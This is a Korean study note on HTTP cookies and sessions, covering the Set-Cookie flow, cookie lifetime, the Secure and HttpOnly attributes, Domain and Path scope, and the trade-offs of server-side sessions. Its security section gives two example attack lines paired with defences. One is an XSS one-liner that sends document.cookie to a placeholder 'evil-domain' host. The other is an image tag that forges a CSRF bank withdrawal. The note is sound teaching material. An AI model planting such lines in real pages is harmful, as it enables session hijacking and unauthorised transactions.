쿠키와 세션은 HTTP 프로토콜의 특징(connectionless, stateless)을 보완하여 클라이언트 상태를 유지하는 방법 (ex. 로그인 정보)

## 쿠키🍪

> 서버가 사용자의 웹 브라우저에 전송하는 작은 데이터 조각

1. 클라이언트가 인증 정보를 입력한 후 서버에 전송
2. 서버에서 인증 정보를 검증한 후 이를 `Set-Cookie` 응답 헤더에 담아 전송 `Set-Cookie: <cookie-name>=<cookie-value>`
3. 브라우저는 응답받은 쿠키를 하드디스크에 저장해두고 동일한 서버에 요청할 때마다 `Cookie` 요청 헤더에 담아 전송

- 여러 개의 쿠키를 `;`로 구분하여 나열할 수 있다.
- 만료일 혹은 지속시간도 명시될 수 있고, 만료된 쿠키는 더이상 보내지 않는다.
- 주로 사용되는 상황
  - 세션 관리
  - 사용자 설정
  - 트래킹
  - 💡 모든 요청마다 쿠키가 전송되기 때문에 성능이 떨어지는 원인이 될 수 있다. 웹 스토리지 IndexedDB를 사용하는 것을 권장한다. 

### 쿠키의 라이프타임

- 세션 쿠키는 브라우저의 세션이 종료될 때 삭제된다.
- 영속 쿠키는 `Expires` 속성에 명시된 날짜에 삭제되거나, `Max-Age` 속성에 명시된 기간 이후 삭제된다.
- ex) Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;

### `Secure`과 `HttpOnly` 쿠키

- Secure 쿠키는 HTTPS 프로토콜 상에서 암호화된 요청일 경우에만 전송된다.
- XSS 공격을 방지하기 위해 `HttpOnly` 쿠키는 자바스크립트로 (document.cookie) 접근할 수 없다. 서버에 전송되기만 한다.

### 쿠키의 스코프

Domain
- 쿠키가 전송되게 될 호스트들을 명시한다.
- 명시되지 않는다면 현재 문서 위치의 호스트 일부를 기본값으로 한다.
- 명시되면 서브도메인들을 포함한다. 만약 Domain=mozilla.org이 설정되면 쿠키들은 developer.mozilla.org와 같은 서브도메인에 포함된다.

Path
- Cookie 헤더를 전송하기 위하여 요청되는 URL 내에 반드시 존재해야 하는 URL 경로
- 만약 Path=/docs이 설정되면 다음의 경로들은 모두 매치된다.
   - /docs, /docs/Web/, /docs/Web/HTTP

## 세션

> 클라이언트의 인증 정보를 서버에 저장하는 방식

1. 클라이언트가 인증 정보를 입력한 후 서버에 전송
2. 서버에서 인증 정보를 검증한 후 세션 아이디를 생성하여 `Set-Cookie` 응답 헤더에 담아 전송
3. 브라우저는 매 요청마다 세션 아이디를 `Cookie` 요청 헤더에 담아 전송

- 사용자 정보를 서버 측에 저장하므로 보안 수준을 높일 수 있다.
- 서버의 자원을 사용한다. 메모리 차지, 동시 접속자가 많은 경우 부하 증가
- 서버 확장(scale out)시 문제가 발생한다.

## 보안 문제

### XSS와 세션 하이재킹

- XSS 취약점을 이용하여 쿠키를 가로챌 수 있다. 이를 통해 클라이언트로 위장할 수 있음.
- ✅ HttpOnly 속성을 통해 자바스크립트를 통해 쿠키 값에 접근하는 것을 막을 수 있다.

```jsx
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

### 사이트간 요청 위조 (CSRF)

- 특정 웹 사이트에 공격자가 의도한 행위를 요청하게 할 수 있다.
- ✅ 민감한 동작에 사용되는 쿠키는 만료 시간을 짧게 설정한다.

```jsx
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

https://developer.mozilla.org/ko/docs/Web/HTTP/Cookies
https://www.daleseo.com/http-session/